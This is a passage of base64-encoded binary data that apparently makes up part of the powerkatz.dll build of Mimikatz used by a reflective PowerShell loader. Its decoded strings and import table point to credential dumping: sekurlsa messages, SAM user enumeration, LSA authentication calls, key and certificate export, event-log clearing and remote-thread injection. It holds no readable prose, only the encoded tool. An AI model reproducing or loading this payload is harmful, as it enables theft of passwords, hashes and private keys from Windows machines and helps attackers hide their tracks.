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A8AHWQOAB1UDQAdNAwAHXIZ4BfQFcABGQoAGXQRABlkEAAZVA8AGTQOABmyFcABHAwAHGQMABxUCwAcNAoAHDIY8BbgFNASwBBwAREGABE0DQARcg1wDGALUAEcCwAcxB8AHHQeABxkHQAcNBwAHAEaABXQAAABBAEABEIAAAEZAwAZQhVwFDAAAAEPBgAPZAkADzQIAA9SC3ABBgIABlICMAEPBgAPZAcAD1QGAA8yC3ABCgQACjQMAAqSBnABIAwAIGQTACBUEgAgNBEAIJIc8BrgGNAWwBRwARIIABJUDwASNAwAEnIOwAxwC2ABCAIACHIEMAELAgAL8gQwARIIABJUCwASNAoAElIOwAxwC2ABBgIABtICMAEPBgAPZA0ADzQMAA+SC3ABGwoAG2QXABtUFQAbNBQAG/IU0BLAEHABGwoAG2QWABtUFQAbNBQAG/IU0BLAEHABEAYAEGQNABA0DAAQkgxwARsLABtkGgAbVBkAGzQYABsBFAAU0BLAEHAAAAEYCgAYZBQAGFQTABg0EgAY0hTQEsAQcAEYCgAYZBMAGFQRABg0EAAYshTQEsAQcAEOBgAONAsADlIKcAlgCFABFwsAFzQcABcBFAAQ8A7gDNAKwAhwB2AGUAAAARYKABZUEwAWNBIAFrIS8BDQDsAMcAtgAQ8GAA9kCwAPNAoAD3ILcAETBAATNAYAEzIPcAEdCwAdNC8AHQEkABbwFOAS0BDADnANYAxQAAABGQgAGXIV4BPQEcAPcA5gDVAMMAEYCgAYZAoAGFQJABg0CAAYMhTQEsAQcAEIAgAI0gQwAQsGAAtSB8AFcARgA1ACMAEhCwAhZFRAIVRTQCE0UkAhAU5AFNASwBBwAAABFgoAFjQOABZSEvAQ4A7QDMAKcAlgCFABFQgAFXQJABVkBwAVVAYAFTIRwAEGAgAGcgIwAQwEAAw0CwAMcghwARkKABl0DQAZZAwAGVQLABk0CgAZchXAARQGABRkDgAUNAwAFJIQcAEOAgAOMgowARIIABJUEwASNBAAErIOwAxwC2ABEQYAETQUABHyCnAJYAhQARcLABc0IQAXARgAEPAO4AzQCsAIcAdgBlAAAAEEAQAEogAAARkKABl0CQAZZAgAGVQHABk0BgAZMhXAARoHABpkFwAaNBYAGgEUABNwAAABGwsAG2QeABtUHQAbNBwAGwEYABTQEsAQcAAAARoLABpUIQAaNCAAGgEaABPwEdAPwA1wDGAAAAEbCQAbVB8AGzQeABsBGgAU0BLAEHAAAAEaCwAaVB0AGjQcABoBFgAT4BHQD8ANcAxgAAABEggAEjQQABKSDtAMwApwCWAIUAEXCQAXZBcAF1QVABc0FAAXARIAEHAAAAEWCQAWVBsAFjQaABYBFgAPwA1wDGAAAAEKAgAKAUkAAQgCAAiSBDABHQwAHXQLAB1kCgAdVAkAHTQIAB0yGeAX0BXAASAMACBkDwAgVA4AIDQMACBSHPAa4BjQFsAUcAESBgASNBEAErIOcA1gDFABHQsAHTQkAB0BHAAW8BTgEtAQwA5wDWAMUAAAARoJABpkGwAaVBoAGjQYABoBFgATcAAAARcJABdkGgAXVBkAFzQYABcBFgAQcAAAARMIABNUDwATNA4AE5IPwA1wDGABGwoAG2QXABtUFgAbNBUAG/IU0BLAEHABFAgAFGQNABRUDAAUNAsAFHIQcAEbCwAbZBgAG1QXABs0FgAbARIAFNASwBBwAAABFgoAFjQWABbSEvAQ4A7QDMAKcAlgCFABEwgAE1QTABM0EgAT0g/ADXAMYAEZCwAZNCgAGQEeABLwEOAO0AzACnAJYAhQAAABHw0AH2QqAB9UKQAfNCgAHwEiABjwFuAU0BLAEHAAAAEhCwAhNCYAIQEeABrwGOAW0BTAEnARYBBQAAABGAoAGGQSABhUEQAYNBAAGLIU0BLAEHABEAYAEGQLABA0CgAQcgxwAQ4EAA40BwAOMgpwARIEABI0CgASUg5wAQsGAAtSB9AFcARgA1ACMAESCAASNBQAEtIO0AzACnAJYAhQARkKABk0DwAZMhXwE+AR0A/ADXAMYAtQARoLABpUIAAaNB8AGgEYABPgEdAPwA1wDGAAAAEbCwAbZBkAG1QXABs0FgAbARIAFNASwBBwAAABHw0AH2RDAB9UQgAfNEEAHwE6ABjwFuAU0BLAEHAAAAEaBgAaNBMAGrIWcBVgFFABBAEABOIAAAETBwATZBcAEzQWABMBFAAMcAAAARQIABRkEgAUVBEAFDQQABTSEHABEAYAEGQSABA0EQAQ0gxwARwMABxkFQAcVBQAHDQTAByyGPAW4BTQEsAQcAETCAATZA4AEzQNABNyD9ANwAtwARQIABRkEwAUV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mZvcm1hdGlvbgBKAUxvb2t1cEFjY291bnRTaWRXAFgAQ29udmVydFN0cmluZ1NpZFRvU2lkVwAAlABDcnlwdEV4cG9ydEtleQAAhgBDcnlwdEFjcXVpcmVDb250ZXh0VwAAmgBDcnlwdEdldEtleVBhcmFtAACgAENyeXB0UmVsZWFzZUNvbnRleHQAkwBDcnlwdEVudW1Qcm92aWRlcnNXAJsAQ3J5cHRHZXRQcm92UGFyYW0AjABDcnlwdERlc3Ryb3lLZXkAnABDcnlwdEdldFVzZXJLZXkAqwFPcGVuRXZlbnRMb2dXAAQBR2V0TnVtYmVyT2ZFdmVudExvZ1JlY29yZHMAADoAQ2xlYXJFdmVudExvZ1cAAGUAQ3JlYXRlU2VydmljZVcAAEMCU2V0U2VydmljZU9iamVjdFNlY3VyaXR5AAAqAEJ1aWxkU2VjdXJpdHlEZXNjcmlwdG9yVwAAwgFRdWVyeVNlcnZpY2VPYmplY3RTZWN1cml0eQAAHQBBbGxvY2F0ZUFuZEluaXRpYWxpemVTaWQAAOIARnJlZVNpZACZAENyeXB0R2V0SGFzaFBhcmFtAKIAQ3J5cHRTZXRLZXlQYXJhbQAAcAJTeXN0ZW1GdW5jdGlvbjAzMgBVAlN5c3RlbUZ1bmN0aW9uMDA1AJ8AQ3J5cHRJbXBvcnRLZXkAAGkCU3lzdGVtRnVuY3Rpb24wMjUAiABDcnlwdENyZWF0ZUhhc2gAiQBDcnlwdERlY3J5cHQAAIsAQ3J5cHREZXN0cm95SGFzaAAAZAFMc2FGcmVlTWVtb3J5AJ0AQ3J5cHRIYXNoRGF0YQCxAU9wZW5UaHJlYWRUb2tlbgBFAlNldFRocmVhZFRva2VuAAC0AER1cGxpY2F0ZVRva2VuRXgAADgAQ2hlY2tUb2tlbk1lbWJlcnNoaXAAAGwAQ3JlZEZyZWUAAGsAQ3JlZEVudW1lcmF0ZVcAAEFEVkFQSTMyLmRsbAAAdQBDcnlwdEJpbmFyeVRvU3RyaW5nVwAAcwBDcnlwdEFjcXVpcmVDZXJ0aWZpY2F0ZVByaXZhdGVLZXkARgBDZXJ0R2V0TmFtZVN0cmluZ1cAAFAAQ2VydE9wZW5TdG9yZQA8AENlcnRGcmVlQ2VydGlmaWNhdGVDb250ZXh0AAAEAENlcnRBZGRDZXJ0aWZpY2F0ZUNvbnRleHRUb1N0b3JlAAAPAENlcnRDbG9zZVN0b3JlAABBAENlcnRHZXRDZXJ0aWZpY2F0ZUNvbnRleHRQcm9wZXJ0eQApAENlcnRFbnVtQ2VydGlmaWNhdGVzSW5TdG9yZQAsAENlcnRFbnVtU3lzdGVtU3RvcmUAAwFQRlhFeHBvcnRDZXJ0U3RvcmVFeAAAQ1JZUFQzMi5kbGwABQBDRExvY2F0ZUNTeXN0ZW0ABABDREdlbmVyYXRlUmFuZG9tQml0cwAABgBDRExvY2F0ZUNoZWNrU3VtAAALAE1ENUZpbmFsAAANAE1ENVVwZGF0ZQAMAE1ENUluaXQAY3J5cHRkbGwuZGxsAAABAERzQWRkU2lkSGlzdG9yeVcAAAUARHNCaW5kVwBdAERzVW5CaW5kVwBOVERTQVBJLmRsbABOAFBhdGhJc1JlbGF0aXZlVwAiAFBhdGhDYW5vbmljYWxpemVXACQAUGF0aENvbWJpbmVXAABTSExXQVBJLmRsbAAmAFNhbVF1ZXJ5SW5mb3JtYXRpb25Vc2VyAAYAU2FtQ2xvc2VIYW5kbGUAABQAU2FtRnJlZU1lbW9yeQATAFNhbUVudW1lcmF0ZVVzZXJzSW5Eb21haW4AIQBTYW1PcGVuVXNlcgAdAFNhbUxvb2t1cE5hbWVzSW5Eb21haW4AABwAU2FtTG9va3VwSWRzSW5Eb21haW4AAB8AU2FtT3BlbkRvbWFpbgAHAFNhbUNvbm5lY3QAABEAU2FtRW51bWVyYXRlRG9tYWluc0luU2FtU2VydmVyAAAYAFNhbUdldEdyb3Vwc0ZvclVzZXIALABTYW1SaWRUb1NpZAAbAFNhbUxvb2t1cERvbWFpbkluU2FtU2VydmVyAAAVAFNhbUdldEFsaWFzTWVtYmVyc2hpcABTQU1MSUIuZGxsAAAoAExzYUxvb2t1cEF1dGhlbnRpY2F0aW9uUGFja2FnZQAAJQBMc2FGcmVlUmV0dXJuQnVmZmVyACMATHNhRGVyZWdpc3RlckxvZ29uUHJvY2VzcwAiAExzYUNvbm5lY3RVbnRydXN0ZWQAIQBMc2FDYWxsQXV0aGVudGljYXRpb25QYWNrYWdlAABTZWN1cjMyLmRsbAAHAENvbW1hbmRMaW5lVG9Bcmd2VwAAU0hFTEwzMi5kbGwAmwFJc0NoYXJBbHBoYU51bWVyaWNXAFVTRVIzMi5kbGwAAAUATUQ0VXBkYXRlAAMATUQ0RmluYWwAAAQATUQ0SW5pdABhZHZhcGkzMi5kbGwAABQAUnRsVW5pY29kZVN0cmluZ1RvQW5zaVN0cmluZwAADQBSdGxGcmVlQW5zaVN0cmluZwASAFJ0bEluaXRVbmljb2RlU3RyaW5nAAAMAFJ0bEVxdWFsVW5pY29kZVN0cmluZwABAE50UXVlcnlPYmplY3QAAgBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24AAA8AUnRsR2V0Q3VycmVudFBlYgAAAABOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzAAkAUnRsQ3JlYXRlVXNlclRocmVhZAATAFJ0bFN0cmluZ0Zyb21HVUlEAA4AUnRsRnJlZVVuaWNvZGVTdHJpbmcAABAAUnRsR2V0TnRWZXJzaW9uTnVtYmVycwAAFgBSdGxVcGNhc2VVbmljb2RlU3RyaW5nAAAIAFJ0bEFwcGVuZFVuaWNvZGVTdHJpbmdUb1N0cmluZwAABwBSdGxBbnNpU3RyaW5nVG9Vbmljb2RlU3RyaW5nAAADAE50UmVzdW1lUHJvY2VzcwAGAFJ0bEFkanVzdFByaXZpbGVnZQAABABOdFN1c3BlbmRQcm9jZXNzAAAFAE50VGVybWluYXRlUHJvY2VzcwAACwBSdGxFcXVhbFN0cmluZwAAbnRkbGwuZGxsAI0DVmlydHVhbFByb3RlY3QAAF0DU2xlZXAAyABGaWxlVGltZVRvU3lzdGVtVGltZQAAVAJMb2NhbEFsbG9jAABYAkxvY2FsRnJlZQCrA1dyaXRlRmlsZQCxAlJlYWRGaWxlAABZAENyZWF0ZUZpbGVXAPEARmx1c2hGaWxlQnVmZmVycwAAZwFHZXRGaWxlU2l6ZUV4AEQBR2V0Q3VycmVudERpcmVjdG9yeVcAADYAQ2xvc2VIYW5kbGUARQFHZXRDdXJyZW50UHJvY2VzcwCCAk9wZW5Qcm9jZXNzAHMBR2V0TGFzdEVycm9yAACWAER1cGxpY2F0ZUhhbmRsZQCNAERldmljZUlvQ29udHJvbAAjA1NldEZpbGVQb2ludGVyAACPA1ZpcnR1YWxRdWVyeQAAigNWaXJ0dWFsRnJlZQCQA1ZpcnR1YWxRdWVyeUV4AACLA1ZpcnR1YWxGcmVlRXgAtAJSZWFkUHJvY2Vzc01lbW9yeQCIA1ZpcnR1YWxBbGxvYwAAjgNWaXJ0dWFsUHJvdGVjdEV4AACJA1ZpcnR1YWxBbGxvY0V4AAC0A1dyaXRlUHJvY2Vzc01lbW9yeQAAZAJNYXBWaWV3T2ZGaWxlAHgDVW5tYXBWaWV3T2ZGaWxlAFgAQ3JlYXRlRmlsZU1hcHBpbmdXAABbAkxvY2FsUmVBbGxvYwAAbABDcmVhdGVQcm9jZXNzVwAALwNTZXRMYXN0RXJyb3IAAJcDV2FpdEZvclNpbmdsZU9iamVjdABtAENyZWF0ZVJlbW90ZVRocmVhZAAASwFHZXREYXRlRm9ybWF0VwAA4wFHZXRUaW1lRm9ybWF0VwAAxwBGaWxlVGltZVRvTG9jYWxGaWxlVGltZQDYAEZpbmRGaXJzdEZpbGVXAADMAUdldFN5c3RlbVRpbWVBc0ZpbGVUaW1lAGQBR2V0RmlsZUF0dHJpYnV0ZXNXAADRAEZpbmRDbG9zZQDgAEZpbmROZXh0RmlsZVcA+wBGcmVlTGlicmFyeQBRAkxvYWRMaWJyYXJ5VwAAogFHZXRQcm9jQWRkcmVzcwAAhAFHZXRNb2R1bGVIYW5kbGVXAAD5AlNldENvbnNvbGVDdXJzb3JQb3NpdGlvbgAAuwFHZXRTdGRIYW5kbGUAAMsARmlsbENvbnNvbGVPdXRwdXRDaGFyYWN0ZXJXADoBR2V0Q29uc29sZVNjcmVlbkJ1ZmZlckluZm8AABIDU2V0Q3VycmVudERpcmVjdG9yeVcAAEgBR2V0Q3VycmVudFRocmVhZAAARgFHZXRDdXJyZW50UHJvY2Vzc0lkAEtFUk5FTDMyLmRsbAAABAVfdnNjd3ByaW50ZgBaBXdjc3JjaHIAUQV3Y3NjaHIAAAcFX3djc2ljbXAAAPoEX3N0cmljbXAAAAkFX3djc25pY21wAFwFd2Nzc3RyAABfBXdjc3RvdWwAXQV3Y3N0b2wAAAoFX3djc3RvdWk2NAAA9gBfZXJybm8AAOAEdmZ3cHJpbnRmACcEZmZsdXNoAACxA193Zm9wZW4ADAFfZmlsZW5vAG8BX2lvYgAAJARmY2xvc2UAADoEZnJlZQAAdANfd2NzZHVwAG1zdmNydC5kbGwAAIAEbWVtY3B5AACEBG1lbXNldAAAUwBfX0Nfc3BlY2lmaWNfaGFuZGxlcgAAUgBfWGNwdEZpbHRlcgB0BG1hbGxvYwAAbAFfaW5pdHRlcm0AoABfYW1zZ19leGl0AAATBGNhbGxvYwAAVARpc2RpZ2l0AH0EbWJ0b3djAAB7AF9fbWJfY3VyX21heAAAVgRpc2xlYWRieXRlAABpBGlzeGRpZ2l0AABtBGxvY2FsZWNvbnYAALoCX3NucHJpbnRmAMYBX2l0b2EADAV3Y3RvbWIAACYEZmVycm9yAABgBGlzd2N0eXBlAAAHBXdjc3RvbWJzAACXBHJlYWxsb2MAZQBfX2JhZGlvaW5mbwB9AF9fcGlvaW5mbwCVAl9yZWFkAN4BX2xzZWVraTY0ANIDX3dyaXRlAAByAV9pc2F0dHkA2wR1bmdldGMAAIkCT3V0cHV0RGVidWdTdHJpbmdBAADeAlJ0bFZpcnR1YWxVbndpbmQAANcCUnRsTG9va3VwRnVuY3Rpb25FbnRyeQAA0AJSdGxDYXB0dXJlQ29udGV4dABlA1Rlcm1pbmF0ZVByb2Nlc3MAAHUDVW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyAABRA1NldFVuaGFuZGxlZEV4Y2VwdGlvbkZpbHRlcgCfAlF1ZXJ5UGVyZm9ybWFuY2VDb3VudGVyAOEBR2V0VGlja0NvdW50AABJAUdldEN1cnJlbnRUaHJlYWRJZAAA4gRfX2Noa3N0awAALgVtZW1jbXAAAAAAAAAAAAAAAAAAAAAAjNziVAAAAAAyUgMAAQAAAAEAAAABAAAAKFIDACxSAwAwUgMAgGAAAEBSAwAAAHBvd2Vya2F0ei5kbGwAcG93ZXJzaGVsbF9yZWZsZWN0aXZlX21pbWlrYXR6AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA